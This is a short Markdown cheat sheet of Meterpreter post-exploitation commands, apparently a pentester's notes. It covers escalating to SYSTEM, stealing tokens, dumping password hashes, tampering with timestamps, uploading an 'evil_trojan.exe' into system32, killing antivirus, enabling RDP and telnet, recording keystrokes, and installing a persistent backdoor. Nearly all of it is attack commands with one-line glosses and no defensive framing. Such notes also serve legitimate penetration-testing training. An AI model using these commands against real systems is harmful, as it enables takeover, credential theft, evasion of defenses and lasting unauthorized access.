# Meterpreter

### Meterpreter Command

Showing running process and their associated user ids: `ps`

Privilege Escalation to Admin:<span style="color:blue">`getsystem`</span>

Show current user name: `getuid`

>`meterpreter > `**`getuid`**

>`Server username: NT AUTHORITY\SYSTEM`

Show current privileges: `getprivs`

Steal Admin: **`steal_token [PID]`**

Incognito \(Similar to `ps`\)

>`meterpreter > `**`use incognito`**

>`meterpreter > `**`list_tokens -u`**

Remove timestamps \(audit log\): `timestomp`

Migrate (migrate to another process on the victim):  `meterpreter > run post/windows/manage/migrate`

hashdump: `meterpreter > run post/windows/gather/hashdump `

upload: `upload evil_trojan.exe c:\\windows\\system32`

### Useful Meterpreter Scripts

Checks to see if you exploited a virtual machine

>`meterpreter > run checkvm`

Checks the security configuration on the victims system and can disable other security measures such as A/V, Firewall, and much more

>`meterpreter > run getcountermeasure`

Enable RDP on a target system if it is disabled

>`meterpreter > run getgui`

The ‘get\_local\_subnets’ script is used to get the local subnet mask of a victim

>`meterpreter > run get_local_subnets`

The ‘gettelnet’ script is used to enable telnet on the victim if it is disabled.

>`meterpreter > run gettelnet -e`

The <span style="color:red">‘killav’</span> script can be used to disable most antivirus programs running as a service on a target.

>`meterpreter > run killav`

The ‘remotewinenum’ script will enumerate system information through wmic on victim. Make note of where the logs are stored.

>`meterpreter > run remotewinenum -u [target username] -p [target pw] -t [target ip]`

The ‘winenum’ script makes for a very detailed windows enumeration tool. It dumps tokens, hashes and much more.

>`meterpreter > run winenum`

The ‘scraper’ script can grab even more system information, including the entire registry.

>`meterpreter > run scraper`

Creating a <span style="color:red">persistent</span> backdoor on a target host.

>`meterpreter > run persistence`

This script will start the Meterpreter Keylogger and save all keys.

>`meterpreter > run keylogrecorder`

